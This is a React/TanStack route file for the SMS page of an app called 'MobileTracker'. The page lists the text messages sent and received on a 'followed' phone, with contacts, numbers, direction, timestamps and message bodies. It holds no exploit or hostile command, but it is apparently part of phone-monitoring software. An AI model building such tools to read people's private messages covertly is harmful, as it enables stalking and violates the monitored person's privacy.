import { createFileRoute } from "@tanstack/react-router";
import { Mail } from "lucide-react";

import { AppShell, EmptyState } from "@/components/AppShell";
import { formatDateTime, useDeviceRows, useSelectedDevice } from "@/lib/tracker";

type Message = {
  id: string;
  contact_name: string | null;
  contact_number: string;
  direction: string;
  body: string;
  occurred_at: string;
};

export const Route = createFileRoute("/_authenticated/sms")({
  head: () => ({
    meta: [
      { title: "Messages | MobileTracker" },
      { name: "description", content: "Read the text messages sent and received on the phone you follow." },
      { property: "og:title", content: "Messages | MobileTracker" },
      { property: "og:description", content: "Text messages sent and received on the followed phone." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: SmsPage,
});

function SmsPage() {
  const { device } = useSelectedDevice();
  const { data, isLoading } = useDeviceRows<Message>("messages", device?.id);

  return (
    <AppShell title="SMS" icon={Mail}>
      {!device ? (
        <EmptyState message="Add a phone first to see its messages." />
      ) : isLoading ? (
        <EmptyState message="Loading messages…" />
      ) : !data?.length ? (
        <EmptyState message="No messages recorded yet." />
      ) : (
        <ul className="divide-y divide-border">
          {data.map((m) => (
            <li key={m.id} className="flex flex-col gap-1 px-6 py-4 md:px-8">
              <div className="flex flex-wrap items-center gap-3">
                <span className="font-medium">{m.contact_name ?? m.contact_number}</span>
                <span className="text-xs text-muted-foreground">{m.contact_number}</span>
                <span
                  className={`rounded-sm px-2 py-0.5 text-xs uppercase ${
                    m.direction === "incoming" ? "bg-info text-info-foreground" : "bg-success text-success-foreground"
                  }`}
                >
                  {m.direction}
                </span>
                <span className="ml-auto text-xs text-muted-foreground">{formatDateTime(m.occurred_at)}</span>
              </div>
              <p className="text-sm font-light">{m.body}</p>
            </li>
          ))}
        </ul>
      )}
    </AppShell>
  );
}
